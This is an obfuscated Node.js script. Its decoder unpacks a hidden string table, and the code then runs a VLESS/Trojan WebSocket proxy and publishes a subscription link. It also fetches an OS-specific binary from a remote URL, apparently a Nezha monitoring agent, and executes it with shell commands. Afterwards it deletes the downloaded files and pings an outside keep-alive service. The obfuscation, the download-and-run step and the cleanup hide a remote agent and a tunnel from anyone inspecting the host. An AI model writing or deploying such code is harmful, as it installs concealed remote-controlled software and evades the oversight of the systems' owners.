(function(f){var y,R,F,N;function h(g,E){return g<<E}function O(g,E){return g>>E}function n(g,E){return g<=E}function A(g,E){return g%E}function m(g,E){return g*E}function a(g,E){return g+E}function d(g,E){return g-E}function U(g,E){return g/E}function G(g,E){return g<E}function l(g,E){return g>E}function r(g,E){return g>=E}function z(g,E,F){return g[E]=F,g}R=z;function B(){return['fromCharCode','object',!0,0]}let e=B();y=Object.assign;F=JSON.parse;let K=['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'],w,E=String[e[0]],M=Uint8Array,H=Uint16Array,$=Uint32Array;N=typeof window===e[1]&&window||typeof self===e[1]&&self||exports||typeof globalThis===e[1]&&globalThis||typeof global===e[1]&&global;let g=(function(F){var n,$,g,e,K;g=z;const O=['atob'];((((n='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/')||'0')&&(K=function(n){var O,K,E;const F=g({},'R','length');for(((E={})||6)&&(O=0)&&0||(K=n[F.R]);G(O,K);O++)E[n.charAt(O)]=O;return E}(n))&&0||($=function(n){var O,G,$,F;let e=(()=>g(g(g(g(g(g(g(g(g(g({},'R','length'),'V','char'),'h',1),'q','charAt'),'U',6),'s',3),'a',0),'d',2),'u','join'),'T',''))();return(F=n[e.R])&&0||(G=A(F,4),$=(l(F,0)?h(K[n[a(e.V,'At')](0)],18):0)|(l(F,e.h)?h(K[n[e.q](1)],12):0)|(l(F,2)?h(K[n[e.q](2)],e.U):0)|(l(F,3)?K[n.charAt(e.s)]:0),O=[E($>>>16),E($>>>8&255),E($&255)],O.length-=[e.a,e.a,e.d,e.h][G],O[e.u](e.T))}))&&0||(e=function(g){return g.replace(/\S{1,4}/g,$)}))&&0||g(F,O[0],function(g){return e(String(g)[a('repl','ace')](/[^A-Za-z0-9\+\/]/g,''))})}(N),function(B){var u,K,j,y,s,J,c,L,C,x,D,q,Q,i,Z,v,I,F,k,f,W,w,g,b,T;let t=[8,0,'p',1,'K','prototype','ined',16,17,9,6,10,5,4,12,13,2,3,7,11,23,27,35,51,59,131,258,25,33,49,129,193,257,2049,3073,'length'];(((D=t[0])||2)&&(c=!0)||true)&&(F=void t[1]);function X(g){throw g}function Y(O,K){var n,F,G,g;g=z;let E=(()=>['input',0,'index','fy','N','method',8,31,'err:','not','B','c','bufferType','resize'])();F=this;(n=void 0,g(g(F,E[0],O),'c',E[1]),K||!(K={}))&&((K[E[2]]&&(F.c=K[E[2]])||2)&&(K[a('veri',E[3])]&&(F[E[4]]=K.verify)));((G=O[F.c++])||6)&&(n=O[F.c++]);switch(G&15){case D:F[E[5]]=D}(E[1]!==A(a(h(G,E[6]),n),E[7])&&X(Error(a(E[8],A(a(h(G,8),n),31))))&&0||n&32&&X(Error(E[9]))||3)&&g(F,E[10],new o(O,g(g(g(g({},'index',F[E[11]]),'bufferSize',K.bufferSize),E[12],K[E[12]]),E[13],K[E[13]])))}(Q=(Y[a('proto','type')][t[2]]=function(){var E,G,F,g,n;g=z;function K(){return['p','B','c',24,0]}let O=K();return((F=this)||9)&&(E=F.input)&&0||(G=void 0,n=void 0,G=F[O[1]][O[0]](),g(F,'c',F.B[O[2]]),F.N&&(n=(h(E[F.c++],O[3])|h(E[F.c++],16)|h(E[F[O[2]]++],8)|E[F.c++])>>>O[4],n!==jb(G)&&X(Error('i32c'))),G)},0))&&0||(C=t[3]);function o(O,G){var g,E;g=z;function n(){return'l|e|g|q|s|bufferSize|n|bufferType|resize|resi|b|a|m|imd'.split('|')}let F=n();E=this;(g(g(g(g(g(g(g(E,F[0],[]),'m',32768),F[1],E[F[2]]=E.c=E[F[3]]=0),'input',L?new M(O):O),F[4],!1),'n',C),'C',!1),G||!(G={}))&&(((G[a('ind','ex')]&&(E.c=G[a('ind','ex')])&&0||G[F[5]]&&(E.m=G[F[5]]))&&0||G.bufferType&&(E[F[6]]=G[F[7]])||7)&&(G[F[8]]&&(E.C=G[a(F[9],'ze')])));switch(E[F[6]]){case Q:E[F[10]]=32768;E[F[11]]=new(L?M:Array)(a(a(32768,E[F[12]]),258));break;case C:E[F[10]]=0;E[F[11]]=new(L?M:Array)(E[F[12]]);E.f=E.K;E.t=E.I;E.o=E.J;break;default:X(Error(F[13]))}}((o.prototype[t[4]]=function($){var O,H,K,e,g,E,n,r;const F=R(R(R(R(R(R(R(R(R(R(R({},'R','c'),'V',0),'h','ut'),'q','a'),'U','v'),'s','G'),'a',2),'d','leng'),'u','th'),'T','length'),'g',258);return(n=this)&&0||(O=a(U(n.input.length,n[F.R]),1)|F.V,g=void F.V,e=void 0,H=void 0,E=n[a('inp',F.h)],K=n[F.q],$&&('number'===typeof $.v&&(O=$[F.U]),'number'===typeof $[F.s]&&(O+=$[F.s])),l(F.a,O)?(g=U(d(E[F.T],n.c),n.u[F.a]),H=m(F.g,U(g,F.a))|0,e=G(H,K[a('leng',F.u)])?a(K[F.T],H):h(K[a(F.d,F.u)],1)):e=m(K[a(F.d,F.u)],O),L?(r=new M(e),r.set(K)):r=K,n.a=r)})&&0||(o[t[5]].I=function(){var g,E,O;const F=(()=>['b','length','a','C','subarray',0,'ray'])();return(g=this)&&0||(O=g[F[0]],L?g[F[3]]?(E=new M(O),E.set(g.a[a('subar',F[6])](0,O))):E=g.a[F[4]](F[5],O):(l(g.a[F[1]],O)&&(g[F[2]].length=O),E=g.a),g.buffer=E)}))&&false||(o[t[5]].J=function(R,M){var $,F,O,e,H,w,N,A,E;F=z;const h='f|th|e'.split('|');for(((((($=this)||'1')&&(e=$.a)||'0')&&(E=$.b)||'1')&&F($,'u',R)||3)&&(N=e[a('leng','th')]);256!==(A=S($,R));)if(l(256,A)){(r(E,N)&&(e=$.f(),N=e[a('leng',h[1])])||true)&&(e[E++]=A)}else{for((((((O=d(A,257))&&0||(w=K[O]))&&0||G(0,j[O])&&(w+=P($,j[O]))||2)&&(A=S($,M))&&false||(H=g[A])||8)&&(G(0,f[A])&&(H+=P($,f[A])))||3)&&(l(a(E,w),N)&&(e=$[h[0]](),N=e[a('leng','th')]));w--;)e[E]=e[d(E++,H)]}for(;n(8,$[h[2]]);)$[h[2]]-=8,$.c--;F($,'b',E)});function e(O){var g,M,N,H,a,F,K,f,E,w,p,R,e;let r=['length','POSITIVE_INFINITY',0,1];((H=O[r[0]])&&0||(F=0))&&0||(a=Number[r[1]]);for(f=r[2];G(f,H);++f)l(O[f],F)&&(F=O[f]),G(O[f],a)&&(a=O[f]);for(e=(K=h(r[3],F),N=new(L?$:Array)(K),E=1,M=r[2],2);n(E,F);){for(f=r[2];G(f,H);++f)if(O[f]===E){for(p=(R=r[2],g=M,r[2]);G(p,E);++p)R=h(R,1)|g&1,g>>=r[3];for(p=(w=h(E,16)|f,R);G(p,K);p+=e)N[p]=w;++M}((++E||true)&&(M<<=r[3])||9)&&(e<<=1)}return[N,F,a]}function S(R,H){var e,n,g,$,K,N,a,E,F,l;E=z;const w=E(E(E(E({},'R','g'),'V','input'),'h','c'),'q','e');for(((((n=R[w.R])&&0||(l=R.e)||6)&&(F=R[w.V])&&0||(a=R[w.h])||'1')&&(g=F.length)&&0||($=H[0]))&&0||(N=H[1]);G(l,N)&&!r(a,g);)n|=h(F[a++],l),l+=8;return e=$[n&d(h(1,N),1)],K=e>>>16,E(E(E(R,'g',O(n,K)),w.q,d(l,K)),'c',a),e&65535}function N(r){var n,g,R,l,H,E,O,F,$;E=z;let K=[5,257,1,4,'length',0,'z','call'];function h(e,$,n){var K,r,g,E,F,O;F=z;const H=(()=>['z',0,3,2,16,11,7,18])();(O=this)&&0||(g=O[H[0]]);for(E=H[1];G(E,e);)switch(K=S(O,$),K){case H[4]:for(r=a(H[2],P(O,H[3]));r--;)n[E++]=g;break;case 17:for(r=a(3,P(O,H[2]));r--;)n[E++]=0;g=H[1];break;case H[7]:for(r=a(H[5],P(O,H[6]));r--;)n[E++]=H[1];g=0;break;default:g=n[E++]=K}return F(O,H[0],g),n}(((((n=a(P(r,K[0]),K[1]))||2)&&(g=a(P(r,K[0]),K[2]))||'1')&&(H=a(P(r,4),K[3]))||3)&&(R=new(L?M:Array)(y[K[4]]))&&0||($=void K[5]))&&0||(l=void K[5]);for(O=0;G(O,H);++O)R[y[O]]=P(r,3);if(!L){for(H=(O=H,R.length);G(O,H);++O)R[y[O]]=K[5]}((((F=e(R))||5)&&($=new(L?M:Array)(n))||5)&&(l=new(L?M:Array)(g))&&false||E(r,K[6],K[5]))&&0||r.o(e(h[K[7]](r,n,F,$)),e(h[K[7]](r,g,F,l)))}function P($,H){var O,E,n,e,g,l,F;E=z;const K=E(E(E(E(E(E(E({},'R','e'),'V','ut'),'h','length'),'q','bk'),'U',1),'s','g'),'a','c');for(((((O=$.g)&&0||(g=$[K.R]))&&0||(e=$[a('inp',K.V)]))&&0||(l=$.c))&&null||(F=e[K.h]);G(g,H);)r(l,F)&&X(Error(K.q)),O|=h(e[l++],g),g+=8;return n=O&d(h(K.U,H),1),E(E(E($,K.s,O>>>H),'e',d(g,H)),K.a,l),n}((((((k=(o[t[5]].p=function(){var $,E,H,g,e,f,O,n,G,K,M;let w=(()=>['s',3,'c','b',0,'iN','length','subar','ray',1,2,'e: ','t'])();for(n=this;!n[w[0]];){((($=P(n,w[1]))||4)&&($&1&&(n[w[0]]=c))||5)&&($>>>=1);switch($){case w[4]:f=n.input;G=n[w[2]];g=n.a;e=n[w[3]];M=f[a('leng','th')];E=F;K=F;H=g[a('leng','th')];O=F;n.e=n.g=w[4];r(a(G,1),M)&&X(Error('iL'));E=f[G++]|h(f[G++],8);r(a(G,1),M)&&X(Error(w[5]));K=f[G++]|h(f[G++],8);E===~K&&X(Error('ih'));l(a(G,E),f[w[6]])&&X(Error('ib'));switch(n.n){case Q:for(;l(a(e,E),g[a('leng','th')]);){if(O=d(H,e),E-=O,L){(g.set(f[a(w[7],w[8])](G,a(G,O)),e)&&0||(e+=O)||7)&&(G+=O)}else{for(;O--;)g[e++]=f[G++]}((n[w[3]]=e)&&false||(g=n.f()))&&0||(e=n.b)}break;case C:for(;l(a(e,E),g[w[6]]);)g=n.f(R({},'v',2));break;default:X(Error('im'))}if(L){(g.set(f[a('subar',w[8])](G,a(G,E)),e)&&0||(e+=E))&&false||(G+=E)}else{for(;E--;)g[e++]=f[G++]}n.c=G;n.b=e;n.a=g;break;case w[9]:n.o(v,x);break;case w[10]:N(n);break;default:X(Error(a(w[11],$)))}}return V(n[w[12]]())},a('undef',t[6])))||'1')&&(L=k!==typeof M&&k!==typeof H&&k!==typeof $&&k!==typeof DataView)||9)&&(y=(T=[t[7],t[8],18,0,8,7,t[9],t[10],t[11],t[12],11,t[13],t[14],3,t[15],t[16],14,t[3],15],L?new H(T):T))||7)&&(K=(w=[t[17],4,5,6,t[18],t[0],t[9],t[11],t[19],13,15,17,19,t[20],t[21],31,t[22],43,t[23],t[24],67,83,99,115,t[25],163,195,227,t[26],t[26],t[26]],L?new H(w):w))||7)&&(j=(q=[0,0,0,0,t[1],0,t[1],0,t[3],t[3],1,t[3],t[16],2,t[16],t[16],3,3,t[17],t[17],t[13],4,4,t[13],t[12],5,t[12],t[12],0,t[1],0],L?new M(q):q))&&0||(g=(J=[t[3],2,t[17],4,5,7,t[9],13,17,t[27],t[28],t[29],65,97,t[30],t[31],t[32],385,513,769,1025,1537,t[33],t[34],4097,6145,8193,12289,16385,24577],L?new H(J):J))||9)&&(f=(W=[t[1],t[1],0,t[1],t[3],1,t[16],2,3,3,t[13],4,t[12],t[12],6,t[10],t[18],7,t[0],8,t[9],t[9],t[11],10,11,11,t[14],12,t[15],t[15]],L?new M(W):W))&&0||(Z=new(L?M:Array)(288));for(s=(s=void t[1],b=t[1],Z[t[35]]);G(b,s);++b)Z[b]=r(143,b)?t[0]:r(255,b)?9:r(279,b)?7:8;((v=e(Z))||9)&&(I=new(L?M:Array)(30));for(i=(i=void 0,u=0,I.length);G(u,i);++u)I[u]=5;x=e(I);function V(n){var F,r,$,K,H,g;const e=(()=>['','length',1,4,6,7,31,13])();((($=void 0)||7)&&(g=e[0])||9)&&($=n[e[1]])&&null||(F=0);while(G(F,$)){r=n[F++];switch(O(r,4)){case 0:case e[2]:case 2:case 3:case e[3]:case 5:case e[4]:case e[5]:g+=E(r);break;case 12:case e[7]:H=n[F++];g+=E(h(r&e[6],6)|H&63);break;case 14:H=n[F++];K=n[F++];g+=E(h(r&15,12)|h(H&63,6)|h(K&63,0))}}return g}B.d=function(g){const E=(()=>['map','','p'])();let F=new Y(new M(B.atob(g)[a('spl','it')](E[1])[E[0]](g=>g.charCodeAt(0))),{}),O=F[E[2]]();return O}}(N),w=typeof globalThis===e[1]&&globalThis||typeof window===e[1]&&window||typeof self===a('obje','ct')&&self||typeof global===e[1]&&global,e[2]);for(let E of K)(E=N.d(E),E=F(E),g)?y(w,E):((w.StringExtract=E)||1)&&y(w,E);for(let g=e[3];G(g,f.length);g++)w[a('_$a',g)]&&y(w,R({},w[a('_$a',g)],f[g]))}([encodeURIComponent,true,parseInt,console.log,{oonm:'PUDP'},{Oqhx:false},{ZLq:true},console.error]));const os=require(NO_),http=require(nO_),fs=require(XO_),axios=require($O_),net=require(PO_),path=require(pO_),crypto=require(TO_),$v3xDj1=require(JO_),Buffer=$v3xDj1[vO_],$vla9x5=require(IO_),exec=$vla9x5[mO_],execSync=$vla9x5[qO_],$vdVwpd=require(_O_),WebSocket=$vdVwpd[GO_],createWebSocketStream=$vdVwpd[ZO_],UUID=process[rO_][fO_]||sO_,NEZHA_SERVER=process[rO_][LO_]||'',NEZHA_PORT=process[rO_][cO_]||'',NEZHA_KEY=process[rO_][iO_]||'',DOMAIN=process[rO_][CO_]||xO_,AUTO_ACCESS=process[rO_][SO_]||!0,WSPATH=process[rO_][wO_]||UUID[tO_](AO_,gO_),SUB_PATH=process[rO_][WO_]||aO_,NAME=process[rO_][UO_]||BO_,PORT=process[rO_][DO_]||MO_;let ISP='';const GetISP=async()=>{try{const d=await axios.get(h__),b=d[b__];ISP=(b[A__]+M__+b[g__])[z__](/ /g,'_')}catch(d){ISP=j__}};GetISP();const httpServer=http[Y__]((b,d)=>{if(b[k__]==='/'){const b=path[$__](__dirname,P__);fs[p__](b,T__,(b,I)=>{if(b){d[d__](kO_,{[K__]:J__}),d[O__](v__);return}d[d__](kO_,{[K__]:J__}),d[O__](I)});return}else{if(b[k__]===y__+SUB_PATH){const P=e__+UUID+E__+DOMAIN+o__+DOMAIN+V__+DOMAIN+R__+WSPATH+l__+NAME+M__+ISP,x=H__+UUID+E__+DOMAIN+F__+DOMAIN+V__+DOMAIN+R__+WSPATH+l__+NAME+M__+ISP,I=P+'\n'+x,b=Buffer[n__](I)[N__](X__);d[d__](kO_,{[K__]:u__}),d[O__](b+'\n')}else{d[d__](YO_,{[K__]:u__}),d[O__](Q__)}}}),wss=new WebSocket[I__]({[m__]:httpServer}),uuid=UUID[z__](/-/g,''),DNS_SERVERS=[q__,___];function resolveHost(d){return new Promise((resolve,reject)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[G__](d)){resolve(d);return}let I=AO_;function b(){if(I>=DNS_SERVERS[Z__]){reject(new Error(f__+d+r__));return}const P=DNS_SERVERS[I];I++;const x=s__+jO_(d)+L__;axios.get(x,{[C__]:yO_,[w__]:{[S__]:x__}})[i__](I=>{const d=I[b__];if(d[t__]===AO_&&d[W__]&&d[W__][Z__]>AO_){const b=d[W__][a__](d=>d[U__]===dO_);if(b){resolve(b[b__]);return}}b()})[c__](d=>((b()),void 0))}b()})}function handleVlessConnection(i,d){var g=tO_,c=dO_;const [x]=d,Q=d[g](c,uO_);if(!Q[B__]((d,b)=>d==hO_(uuid[D__](b*KO_,KO_),OO_))){return!1}let O=d[g](uO_,QO_)[jL_]()+eO_;const I=d[g](O,O+=KO_)[hL_](AO_),b=d[g](O,O+=c)[jL_](),P=b==c?d[g](O,O+=oO_)[$__]('.'):b==KO_?new TextDecoder()[gL_](d[g](O+c,O+=c+d[g](O,O+c)[jL_]())):b==EO_?d[g](O,O+=OO_)[zL_]((I,b,x,d)=>x%KO_?I[AL_](d[tO_](x-dO_,x+dO_)):I,[])[bL_](d=>d[hL_](AO_)[N__](OO_))[$__](':'):'';i[ML_](new Uint8Array([x,AO_]));const m=createWebSocketStream(i);resolveHost(P)[i__](b=>((net[kL_]({[yL_]:b,[dL_]:I},function(){this[uL_](d[tO_](O)),m[YL_](OL_,()=>{})[KL_](this)[YL_](OL_,()=>{})[KL_](m)})[YL_](OL_,()=>{})),void 0))[c__](b=>((net[kL_]({[yL_]:P,[dL_]:I},function(){this[uL_](d[tO_](O)),m[YL_](OL_,()=>{})[KL_](this)[YL_](OL_,()=>{})[KL_](m)})[YL_](OL_,()=>{})),void 0));return!0}function handleTrojanConnection(I,d){var b=tO_,P=dO_;try{if(d[Z__]<VO_){return!1}const i=d[b](AO_,RO_)[N__](),x=[UUID];let O=null;for(const d of x){const b=crypto[EL_](oL_)[eL_](d)[QL_](VL_);if(b===i){O=d;break}}if(!O){return!1}let offset=RO_;if(d[offset]===lO_&&d[offset+P]===HO_){offset+=KO_}const k=d[offset];if(k!==P){return!1}offset+=P;const m=d[offset];offset+=P;let g,c;if(m===P){g=d[b](offset,offset+oO_)[$__]('.'),offset+=oO_}else{if(m===EO_){const I=d[offset];offset+=P,g=d[b](offset,offset+I)[N__](),offset+=I}else{if(m===oO_){g=d[b](offset,offset+OO_)[zL_]((I,b,x,d)=>x%KO_?I[AL_](d[tO_](x-dO_,x+dO_)):I,[])[bL_](d=>d[hL_](AO_)[N__](OO_))[$__](':'),offset+=OO_}else{return!1}}}c=d[hL_](offset),offset+=KO_;if(offset<d[Z__]&&d[offset]===lO_&&d[offset+P]===HO_){offset+=KO_}const Q=createWebSocketStream(I);resolveHost(g)[i__](b=>((net[kL_]({[yL_]:b,[dL_]:c},function(){if(offset<d[Z__]){this[uL_](d[tO_](offset))}Q[YL_](OL_,()=>{})[KL_](this)[YL_](OL_,()=>{})[KL_](Q)})[YL_](OL_,()=>{})),void 0))[c__](b=>((net[kL_]({[yL_]:g,[dL_]:c},function(){if(offset<d[Z__]){this[uL_](d[tO_](offset))}Q[YL_](OL_,()=>{})[KL_](this)[YL_](OL_,()=>{})[KL_](Q)})[YL_](OL_,()=>{})),void 0));return!0}catch(x){return!1}}wss[YL_](RL_,(d,I)=>{const b=I[k__]||'';d[lL_](HL_,b=>{if(b[Z__]>uO_&&b[AO_]===AO_){const I=b[tO_](dO_,uO_),x=I[B__]((d,b)=>d==hO_(uuid[D__](b*KO_,KO_),OO_));if(x){if(!handleVlessConnection(d,b)){d[FL_]()}return}}if(!handleTrojanConnection(d,b)){d[FL_]()}})[YL_](OL_,()=>{})});const getDownloadUrl=()=>{const d=os[NL_]();return d===nL_||d===XL_||d===$L_?!NEZHA_PORT?JL_:TL_:!NEZHA_PORT?pL_:PL_},downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY){return}try{const I=getDownloadUrl(),d=await axios({[vL_]:'get',[k__]:I,[mL_]:IL_}),b=fs[qL_](_L_);d[b__][KL_](b);return new Promise((resolve,reject)=>((b[YL_](GL_,()=>((bO_(ZL_)),(exec(fL_,d=>{if(d){reject(d)}resolve()})),void 0))),(b[YL_](OL_,reject)),void 0))}catch(d){throw d}},runnz=async()=>{try{const status=execSync(rL_,{[LL_]:sL_});if(status[cL_]()!==''){bO_(iL_);return}}catch(b){}await downloadFile();let x='',d=[CL_,xL_,SL_,wL_,tL_,WL_];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const b=d[UL_](NEZHA_PORT)?y7_:'';x=d7_+NEZHA_SERVER+u7_+NEZHA_PORT+K7_+NEZHA_KEY+O7_+b+Q7_}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const I=NEZHA_SERVER[UL_](':')?NEZHA_SERVER[DL_](':')[BL_]():'',b=d[UL_](I)?h7_:j7_,x=b7_+NEZHA_KEY+z7_+NEZHA_SERVER+A7_+b+g7_+UUID;fs[M7_](Y7_,x)}x=k7_}else{bO_(aL_);return}}try{exec(x,{[o7_]:E7_},d=>{if(d){zO_(R7_,d)}else{bO_(V7_)}})}catch(I){zO_(e7_+I)}};async function addAccessTask(){if(!AUTO_ACCESS){return}if(!DOMAIN){return}const d=l7_+DOMAIN;try{const b=await axios[H7_](F7_,{[k__]:d},{[w__]:{[K__]:N7_}});bO_(n7_)}catch(b){}}const delFiles=()=>((fs[X7_](_L_,()=>{})),(fs[X7_](Y7_,()=>{})),void 0);httpServer[$7_](PORT,()=>((runnz()),(setTimeout(()=>((delFiles()),void 0),FO_)),(addAccessTask()),(bO_(P7_+PORT)),void 0))
